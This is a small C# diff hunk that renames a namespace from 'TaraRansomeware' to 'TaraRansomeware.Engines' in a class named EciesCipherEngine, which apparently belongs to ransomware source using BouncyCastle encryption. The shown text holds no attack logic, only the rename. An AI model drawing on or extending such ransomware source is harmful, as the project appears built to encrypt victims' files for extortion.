@@ -8,7 +8,7 @@ using Org.BouncyCastle.Crypto.Paddings;
 using Org.BouncyCastle.Crypto.Parameters;
 using System;
 
-namespace TaraRansomeware
+namespace TaraRansomeware.Engines
 {
     internal class EciesCipherEngine
     {
